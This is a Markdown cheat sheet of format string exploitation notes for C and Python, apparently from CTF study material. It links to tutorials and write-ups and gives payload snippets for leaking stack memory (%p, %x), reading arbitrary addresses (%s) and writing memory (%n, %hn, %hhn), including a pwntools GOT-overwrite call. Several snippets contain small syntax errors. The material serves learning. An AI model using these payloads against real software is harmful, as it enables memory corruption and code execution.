# Documentation 

### Python format strings

- https://podalirius.net/en/articles/python-format-string-vulnerabilities/

### C format strings 

- https://corgi.rip/blog/format-string-exploitation/
- https://axcheron.github.io/exploit-101-format-strings/
- https://osandamalith.com/2018/02/01/exploiting-format-strings-in-windows/
- https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html

### Tool

- https://docs.pwntools.com/en/stable/fmtstr.html # Automate format string exploit (read & write)


## Read from memory (%x, %p)


```python 
print('%p-'*200)
```

```python
# leak = result
leak = ""
out = b""
for p in leak.split("-"):
    if not p.startswith("0x"):
        continue
    h = p[2:].zfill(16)             # 8 bytes
    out += bytes.fromhex(h)[::-1]   # little endian

print(bytes(c for c in out if 32 <= c <= 126).decode())
```

### Get arguments offsets (%N$x)

- [calling_conventions](https://github.com/4nuit/Hacking/tree/master/pwn/stack#calling-conventions)
- https://www.ctfrecipes.com/pwn/stack-exploitation/format-string/data-leak


```c
// prints the first 5 arguments
printf('%4$x');
// equivalent
printf('%x%x%x%x');
```

```bash
echo -ne 'AAAA%4$p' | ./fmt
#AAAA0x41414141
```

#### Targeting an argument (%s)

```c
// leak of the 5th (4+1) argument
printf('%4$s')
```

### Read an address (%s)

```c
// argument | address
// 4        | 0x55552324
printf('%4sAAAA\x43\x23\x55\x55')
```


## Write to memory  (%Nx, %n)

- [HTB - CyberApocalypse - Pwn Delulu](https://github.com/4nuit/Writeup/tree/master/2024/HTB_CyberApocalypse/pwn/pwn_delulu)
- [Patriot CTF - GOT Overwrite](https://github.com/4nuit/Writeup/tree/master/2023/Patriot/pwn/printshop)
- https://www.ctfrecipes.com/pwn/stack-exploitation/arbitrary-code-execution/code-reuse-attack/got-overwrite
- https://www.ctfrecipes.com/pwn/protections/stack-canaries#bypassing-canaries

```py

payload = fmtstr_payload(4, {0x55552324: 0x12345678, numbwritten=0)
```

### Padding (%Nx: stack buffer overflow)

```bash
%x
//arg1

%400x
//padding
//                  arg1

%400d
//padding, size of integer
```

### Write a value (%n)


```c
// argument | address   | value to write
// 4        | 0x55552324| sizeof(addr) + 6 (=10)
printf('\x43\x23\x55\x55%6c%4$n')
```

### Write an address(%hn)

- %n uses 4 bytes-> big hexa addr
- %hn uses 2 bytes-> useful
- %hhn uses 1byte

```bash
rax2 0xbeef
48879
```

```c
printf('%48879d%7$hn')
```

### Call free / malloc

```c
// prints 2**16-1 elements
printf('%100000x')
```

### Exploit

0xdeadbeef = 0xdead (high) "+" 0xbeef (low)

- `%[hex to write]x%[controlled n]$n`
- `[endian(low write address) + endian(high write address = low +2)]%[low hex to write - 8]x%[controlled n]$hn%[hex abs((low-8)-(high-8)) to write]x%[n+1] $hn"')`

we may use 4 patterns with %hhn
